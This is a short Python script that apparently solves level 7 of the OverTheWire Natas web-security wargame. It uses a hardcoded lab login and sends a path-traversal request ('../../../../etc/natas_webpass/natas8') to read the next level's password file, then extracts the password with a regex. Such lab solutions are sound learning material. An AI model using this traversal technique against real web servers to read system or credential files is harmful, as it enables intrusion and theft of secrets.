
import re        #regual expression library
import requests

username='natas7'
password='7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url='http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8' %username

session=requests.session()

response=session.get(url, auth=(username,password))

content=response.text

#print (content)

print re.findall("<br>\n(.*)\n\n<!--", content)[0]
#if the password is on the new line just include \n and find the next string to.(orelse error)

